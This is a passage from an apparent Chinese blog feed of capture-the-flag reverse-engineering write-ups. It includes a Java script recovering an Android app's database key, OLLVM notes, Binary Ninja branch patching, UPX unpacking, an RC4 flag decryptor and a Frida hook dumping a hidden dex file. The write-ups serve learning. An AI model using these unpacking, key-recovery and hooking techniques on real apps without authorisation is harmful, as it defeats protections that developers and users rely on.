class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">a</span><span class="hljs-params">()</span> &#123;<br>        SQLiteDatabase.loadLibs(<span class="hljs-built_in">this</span>); <br>        <span class="hljs-built_in">this</span>.b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">a</span>(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Demo.db&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">ContentValues</span> <span class="hljs-variable">contentValues</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContentValues</span>();<br>        contentValues.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Stranger&quot;</span>);<br>        contentValues.put(<span class="hljs-string">&quot;password&quot;</span>, (Integer) <span class="hljs-number">123456</span>);<br>        com.example.yaphetshan.tencentwelcome.a.<span class="hljs-type">a</span> <span class="hljs-variable">aVar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.example.yaphetshan.tencentwelcome.a.a();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> aVar.a(contentValues.getAsString(<span class="hljs-string">&quot;name&quot;</span>), contentValues.getAsString(<span class="hljs-string">&quot;password&quot;</span>));<br>        <span class="hljs-built_in">this</span>.a = <span class="hljs-built_in">this</span>.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(<span class="hljs-string">&quot;password&quot;</span>))).substring(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>));<br>        <span class="hljs-built_in">this</span>.a.insert(<span class="hljs-string">&quot;TencentMicrMsg&quot;</span>, <span class="hljs-literal">null</span>, contentValues);<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>加载SQLite数据库库文件</li><li>创建一个名为a的SQLiteOpenHelper子类实例</li><li>建ContentValues对象,用于存储要插入数据库的键值对,向contentValues添加键值对 name:Stranger,password:123456</li><li>实例化了一个com.example.yaphetshan.tencentwelcome.a.a类 </li><li>调用aVar的a方法,传入name和password,返回一个字符串结果。点进去注意到这一块代码：取传入的两个字符串的前四位作为返回值,即得到”Stra”和”1234”</li><li>先调用aVar.b方法处理 a 和 password,然后与 a 拼接,再用aVar.a方法处理拼接后的字符串,然后取前七个字符作为数据库的密钥<br>获取密钥的脚本如下：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.security.MessageDigest;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">b</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">varV2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Stra1234&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">varV1B</span> <span class="hljs-operator">=</span> a(varV2);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">varKey</span> <span class="hljs-operator">=</span> varV2 + varV1B + <span class="hljs-string">&quot;yaphetshan&quot;</span>;<br>        System.out.print(<span class="hljs-string">&quot;KEY = &quot;</span>);<br>        System.out.print(b(varKey).substring(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">a</span><span class="hljs-params">(String arg9)</span> &#123;<br>        String v0_2;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span>[] v2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>&#125;;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] v1 = arg9.getBytes();<br>            <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);<br>            v3.update(v1);<br>            <span class="hljs-type">byte</span>[] v3_1 = v3.digest();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> v3_1.length;<br>            <span class="hljs-type">char</span>[] v5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[v4 * <span class="hljs-number">2</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">v1_1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>(v0 &lt; v4) &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> v3_1[v0];<br>                <span class="hljs-type">int</span> <span class="hljs-variable">v7</span> <span class="hljs-operator">=</span> v1_1 + <span class="hljs-number">1</span>;<br>                v5[v1_1] = v2[v6 &gt;&gt;&gt; <span class="hljs-number">4</span> &amp; <span class="hljs-number">15</span>];<br>                v1_1 = v7 + <span class="hljs-number">1</span>;<br>                v5[v7] = v2[v6 &amp; <span class="hljs-number">15</span>];<br>                ++v0;<br>            &#125;<br><br>            v0_2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(v5);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(Exception v0_1) &#123;<br>            v0_2 = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> v0_2;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String <span class="hljs-title function_">b</span><span class="hljs-params">(String arg9)</span> &#123;<br>        String v0_2;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">v0</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span>[] v2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[]&#123;<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>&#125;;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] v1 = arg9.getBytes();<br>            <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">v3</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;SHA-1&quot;</span>);<br>            v3.update(v1);<br>            <span class="hljs-type">byte</span>[] v3_1 = v3.digest();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">v4</span> <span class="hljs-operator">=</span> v3_1.length;<br>            <span class="hljs-type">char</span>[] v5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[v4 * <span class="hljs-number">2</span>];<br>            <span class="hljs-type">int</span> <span class="hljs-variable">v1_1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>(v0 &lt; v4) &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">v6</span> <span class="hljs-operator">=</span> v3_1[v0];<br>                <span class="hljs-type">int</span> <span class="hljs-variable">v7</span> <span class="hljs-operator">=</span> v1_1 + <span class="hljs-number">1</span>;<br>                v5[v1_1] = v2[v6 &gt;&gt;&gt; <span class="hljs-number">4</span> &amp; <span class="hljs-number">15</span>];<br>                v1_1 = v7 + <span class="hljs-number">1</span>;<br>                v5[v7] = v2[v6 &amp; <span class="hljs-number">15</span>];<br>                ++v0;<br>            &#125;<br><br>            v0_2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(v5);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>(Exception v0_1) &#123;<br>            v0_2 = <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> v0_2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行得出 KEY &#x3D; ae56f99<br>3. 用这个密钥打开 Encryto.db ,浏览数据可以看到<code>GN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=</code>,base64解码,</p><blockquote><p>Tctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OLLVM</title>
    <link href="/2025/03/27/ollvm/"/>
    <url>/2025/03/27/ollvm/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><ol><li><strong>LLVM</strong>是一个优秀的编译器框架,采用经典的三段式设计。前端可以使用不同的编译工具对代码文件做词法分析以形成抽象语法树AST,然后将分析好的代码转换成LLVM的中间表示IR(intermediate representation);<strong>Pass对IR做优化</strong>,后端(Backend)负责将优化好的IR解释成对应平台的机器码.</li><li>从字面看,OLLVM就是在LLVM的基础上增加了obfuscator（混淆）,LLVM的pass是用来优化分析的,将这些pass的功能改为混淆代码,就是<strong>OLLVM</strong>项目.</li></ol><h3 id="0x01-OLLVM的几种混淆方式"><a href="#0x01-OLLVM的几种混淆方式" class="headerlink" title="0x01 OLLVM的几种混淆方式"></a>0x01 OLLVM的几种混淆方式</h3><p><strong>1.指令替换（Instructions Substitution）</strong><br>用功能等效但更复杂的指令序列替换标准的二进制运算符（如加法、减法或布尔运算符）。当有多个等效指令序列时,随机选择一个。<br>如：</p><ul><li>加法：<code>a = -(-b + (-c))</code>  ,<code>r = rand (); a = b + r; a = a + c; a = a - r</code></li><li>AND：<code>a = b &amp; c =&gt; a = (b ^ ~c) &amp; b</code></li><li>XOR: <code>a = a ^ b =&gt; a = (~a &amp; b) | (a &amp; ~b)</code></li></ul><p><strong>2.虚假控制流(Bogus Control Flow)</strong><br>BCF模式通过加入包含不透明谓词的条件跳转（即跳转与否在运行之前就已经确定的跳转，但IDA无法分析）和不可达的基本块，来干扰IDA的控制流分析和F5反汇编</p><p><strong>3.控制流平坦化(Control Flow Flattening)</strong></p><ul><li>通过一个主分发器来控制程序基本块的执行流程</li><li>不改变源代码的功能前提下,将C或C++代码中的if、while、for、do等控制语句转换成switch分支语句</li><li>这种混淆方式增加了很多无用的case分支,但是没有改变原来的函数调用关系,基于这点，可以根据经验筛选出一些重点函数来hook,看看这些函数的参数都是啥,都返回了什么,以此来猜测这些函数的功能</li></ul><p><strong>4.字符串加密如Armariris字符串混淆</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>混淆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手动去除间接跳转--Binary Ninja</title>
    <link href="/2025/03/21/fixjump/"/>
    <url>/2025/03/21/fixjump/</url>
    
    <content type="html"><![CDATA[<h3 id="题目-ez-re-N1-Junior-2025-Reverse"><a href="#题目-ez-re-N1-Junior-2025-Reverse" class="headerlink" title="题目 ez_re (N1 Junior 2025 Reverse)"></a>题目 ez_re (N1 Junior 2025 Reverse)</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p><strong>将文件直接用<code>Binary Ninja</code>打开之后会发现有很多分析不出来的<code>br跳转</code>,需要修一修</strong><br><img src="/../images/4/1.png"><br><img src="/../images/4/2.png"></p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p><strong>找一个函数<code>my_strlen</code>,可以看到<code>mov     w11, #0  mov     w12, #0x1</code>初始化寄存器的值，下面的<code>cmp     w10, #0 csel    w10, w11, w12, ne  &#123;0x0&#125;  &#123;0x1&#125;</code>是关键，先将w10的值跟0x0比较，如果不等于0，则将w10的值设置为w11，否则设置为w12，这一步就导致了后面两种不同的情况的跳转，也就是我们需要手修的地方</strong><br><img src="/../images/4/4.png"><br><strong>看注释就行</strong><br><strong>note：</strong><br><strong>1.[5230]和[5238]在{data_5230}里面可以找到</strong><br><img src="/../images/4/5.png"><br><strong>2.w11存的值需要往上找对应的sp，先看到w8,然后再往上看需要找[x0]，因为在ARM架构中前 8 个参数通过寄存器 x0-x7 传递，即去找传入函数的第一个参数</strong><br><img src="/../images/4/6.png"><br><strong>这里用伪C看就能很清晰地看到<code>&amp;var_28</code>传入<code>my_strlen</code>,所以<code>w8=[x0]=0xd0deba7d</code></strong><br><img src="/../images/4/3.png"><br><strong>3.计算出来可以知道x8&#x3D;23C8 or 23D8,而23C8就是br x8指令下面一条地址，也正是以为这个跳转有两种情况所以bn分析不出来，需要手动修改</strong></p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p><strong>修改<code>br x8</code>,右键-&gt;<code>Patch</code>-&gt;<code>Assemble</code>,这里需要追前面比较的地方<code>csel</code>后面是<code>ne</code>-&gt;not equel,所以改成<code>bne </code>,这里跳转的地址是相对地址，要用需要跳转的地址减去现在的地址即用23D8-23C4得到0x14，最终<code>bne 0x14</code>,最后<code>Reanalyze</code>一下就修好了</strong><br><img src="/../images/4/7.png"><br><strong>其他需要修的跳转基本上都是这个模式，先比较，有两种跳转情况，分析之后再去手修跳转</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Android</tag>
      
      <tag>arm汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame CTF 2025 Reverse部分题目复现</title>
    <link href="/2025/02/23/hgame/"/>
    <url>/2025/02/23/hgame/</url>
    
    <content type="html"><![CDATA[<h1 id="REverse"><a href="#REverse" class="headerlink" title="REverse"></a>REverse</h1><h2 id="Turtle"><a href="#Turtle" class="headerlink" title="Turtle"></a>Turtle</h2><ol><li>用<code>Exeinfo PE</code>打开发现是upx壳，而且题目也提示了需要脱壳，upx壳被魔改过了，用普通脱壳工具无效，于是手动脱壳。<br><img src="/../images/2/1.png" alt="Exeinfo PE"><blockquote><p>ps：有的魔改后的upx壳可以在010editor中改（把add0-&gt;upx0,add1-&gt;upx1……,本题为只读文件改不了） </p></blockquote></li><li>用xdbg64打开，oep脱壳定律找到大跳转，打断点<br><img src="/../images/2/2.png" alt="xdbg64"></li><li>F9运行，接着用<code>Scylla</code>Dump，oep为00000000004014E0,生成Turtle_dump.exe<br><img src="/../images/2/3.png" alt="Scylla Dump"><br><img src="/../images/2/4.png" alt="Turtle_dump.exe"><br>接着先后点击<code>IAT Autosearch</code>,<code>Get Imports</code>,<code>Fix Dump</code>,这里打开Turtle_dump.exe，之后打开文件夹就会看到新生成的Turtle_dump_SCY.exe文件了。<br><img src="/../images/2/5.png" alt="IAT Autosearch"><br><img src="/../images/2/6.png" alt="Get Imports"></li><li>将Turtle_dump_SCY.exe用IDA(64)打开，发现可以正常地看到函数了，找到main函数，F5反汇编一下<br><img src="/../images/2/7.png" alt="main"></li><li>点开函数后可以看出sub_401550是rc4 init，而sub_40163E（标准）和sub_40175A（魔改）是两个rc4</li><li>解出flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher.ARC4 <span class="hljs-keyword">import</span> *  <br>enc_key = <span class="hljs-built_in">bytes</span>([<br> <span class="hljs-number">0xCD</span>,<br> <span class="hljs-number">0x8F</span>,<br> <span class="hljs-number">0x25</span>,<br> <span class="hljs-number">0x3D</span>,<br> <span class="hljs-number">0xE1</span>,<br> ])<br> <br>enc_key += <span class="hljs-string">b&#x27;QJ&#x27;</span><br> <br>cipher = new(<span class="hljs-string">b&#x27;yekyek&#x27;</span>)<br>dec_key = cipher.decrypt(enc_key)<br><span class="hljs-built_in">print</span>(dec_key)<br><span class="hljs-comment">#ecg4ab6</span><br> <br>enc_flag = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>)]<br>v5 = enc_flag<br>v5[<span class="hljs-number">0</span>] = -<span class="hljs-number">8</span><br>v5[<span class="hljs-number">1</span>] = -<span class="hljs-number">43</span><br>v5[<span class="hljs-number">2</span>] = <span class="hljs-number">98</span><br>v5[<span class="hljs-number">3</span>] = -<span class="hljs-number">49</span><br>v5[<span class="hljs-number">4</span>] = <span class="hljs-number">67</span><br>v5[<span class="hljs-number">5</span>] = -<span class="hljs-number">70</span><br>v5[<span class="hljs-number">6</span>] = -<span class="hljs-number">62</span><br>v5[<span class="hljs-number">7</span>] = <span class="hljs-number">35</span><br>v5[<span class="hljs-number">8</span>] = <span class="hljs-number">21</span><br>v5[<span class="hljs-number">9</span>] = <span class="hljs-number">74</span><br>v5[<span class="hljs-number">10</span>] = <span class="hljs-number">81</span><br>v5[<span class="hljs-number">11</span>] = <span class="hljs-number">16</span><br>v5[<span class="hljs-number">12</span>] = <span class="hljs-number">39</span><br>v5[<span class="hljs-number">13</span>] = <span class="hljs-number">16</span><br>v5[<span class="hljs-number">14</span>] = -<span class="hljs-number">79</span><br>v5[<span class="hljs-number">15</span>] = -<span class="hljs-number">49</span><br>v5[<span class="hljs-number">16</span>] = -<span class="hljs-number">60</span><br>v5[<span class="hljs-number">17</span>] = <span class="hljs-number">9</span><br>v5[<span class="hljs-number">18</span>] = -<span class="hljs-number">2</span><br>v5[<span class="hljs-number">19</span>] = -<span class="hljs-number">29</span><br>v5[<span class="hljs-number">20</span>] = -<span class="hljs-number">97</span><br>v5[<span class="hljs-number">21</span>] = <span class="hljs-number">73</span><br>v5[<span class="hljs-number">22</span>] = -<span class="hljs-number">121</span><br>v5[<span class="hljs-number">23</span>] = -<span class="hljs-number">22</span><br>v5[<span class="hljs-number">24</span>] = <span class="hljs-number">89</span><br>v5[<span class="hljs-number">25</span>] = -<span class="hljs-number">62</span><br>v5[<span class="hljs-number">26</span>] = <span class="hljs-number">7</span><br>v5[<span class="hljs-number">27</span>] = <span class="hljs-number">59</span><br>v5[<span class="hljs-number">28</span>] = -<span class="hljs-number">87</span><br>v5[<span class="hljs-number">29</span>] = <span class="hljs-number">17</span><br>v5[<span class="hljs-number">30</span>] = -<span class="hljs-number">63</span><br>v5[<span class="hljs-number">31</span>] = -<span class="hljs-number">68</span><br>v5[<span class="hljs-number">32</span>] = -<span class="hljs-number">3</span><br>v5[<span class="hljs-number">33</span>] = <span class="hljs-number">75</span><br>v5[<span class="hljs-number">34</span>] = <span class="hljs-number">87</span><br>v5[<span class="hljs-number">35</span>] = -<span class="hljs-number">60</span><br>v5[<span class="hljs-number">36</span>] = <span class="hljs-number">126</span><br>v5[<span class="hljs-number">37</span>] = -<span class="hljs-number">48</span><br>v5[<span class="hljs-number">38</span>] = -<span class="hljs-number">86</span><br>v5[<span class="hljs-number">39</span>] = <span class="hljs-number">10</span><br><br>add_bytes = new(<span class="hljs-string">b&#x27;ecg4ab6&#x27;</span>).encrypt(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">40</span>)<br> <br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    flag += <span class="hljs-built_in">chr</span>((enc_flag[i] + add_bytes[i]) &amp; <span class="hljs-number">0xff</span>) <br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#output:</span><br><span class="hljs-comment">#b&#x27;ecg4ab6&#x27;</span><br><span class="hljs-comment">#hgame&#123;Y0u&#x27;r3_re4l1y_g3t_0Ut_of_th3_upX!&#125;</span><br></code></pre></td></tr></table></figure><p>flag: hgame{Y0u’r3_re4l1y_g3t_0Ut_of_th3_upX!}</p><h2 id="尊嘟假嘟"><a href="#尊嘟假嘟" class="headerlink" title="尊嘟假嘟"></a>尊嘟假嘟</h2><ol><li>在 MuMu模拟器 打开 apk，点击下方 尊嘟 假嘟 按钮的话就是让图片跳转，但其实你分别在两个界面点图片的能发现出现了”0.o”和”o.0” 的字符，并且是逐渐加长的</li><li>用 jadx 打开 apk，先看到有一个<code>DexCall</code>类<br><img src="/../images/2/zj2.png"><br>静态加载了两个本地库“zunjia”和“check”，注意到核心方法<code>callDexMethod</code>,动态加载<code>.dex</code>文件</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">public <span class="hljs-keyword">static</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">callDexMethod</span>(<span class="hljs-title class_">Context</span> context, <span class="hljs-title class_">String</span> dexFileName, <span class="hljs-title class_">String</span> className, <span class="hljs-title class_">String</span> methodName, <span class="hljs-title class_">Object</span> input) <br></code></pre></td></tr></table></figure><p>最后又将 dex 文件删掉，这让我想到之前做的一道 <strong>Find My Dex</strong> 的题目，于是准备先用 frida hook 拿出这个被删掉的 dex 文件<br>frida-server连一下<br><img src="/../images/2/zj1.png"><br>hook 出 dex 文件的地址</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 确保 File 类正确加载</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">File</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.io.File&quot;</span>);<br> <br>    <span class="hljs-comment">// 获取 DexCall 类</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">DexCall</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.nobody.zunjia.DexCall&quot;</span>);<br> <br>    <span class="hljs-comment">// Hook callDexMethod 方法</span><br>    <span class="hljs-title class_">DexCall</span>.<span class="hljs-property">callDexMethod</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">context, dexFileName, className, methodName, input</span>) &#123;<br>        <span class="hljs-comment">// 获取 dexDir 的路径信息</span><br>        <span class="hljs-keyword">var</span> dexDir = <span class="hljs-title class_">File</span>.$new(context.<span class="hljs-title function_">getCacheDir</span>(), <span class="hljs-string">&quot;dex&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;dexDir path: &quot;</span> + dexDir.<span class="hljs-title function_">getAbsolutePath</span>());<br> <br>        <span class="hljs-comment">// 打印 dexFileName 和其他参数信息</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;dexFileName: &quot;</span> + dexFileName);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;className: &quot;</span> + className);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;methodName: &quot;</span> + methodName);<br> <br>        <span class="hljs-comment">// 调用原始的 callDexMethod 方法</span><br>        <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">callDexMethod</span>(context, dexFileName, className, methodName, input);<br> <br>        <span class="hljs-comment">// 返回结果</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/../images/2/zj3.png"><br>注意这里需要点击图片才能触发<code>DexCall.callDexMethod</code>，点<code>callDexMethod</code> x 交叉引用跳转<br><img src="/../images/2/zj4.png"><br>点<code>setText</code> x 交叉引用跳转<br><img src="/../images/2/zj5.png"><br>而这个 JiaDu 是 ImageView</p><p>触发后<br><img src="/../images/2/zj6.png"><br>可以知道这个 dex 文件的地址是在<code>/data/user/0/com.nobody.zunjia/cache/dex</code><br>再用一个脚本把它hook出来</p><figure class="highlight js"><table><tr><td 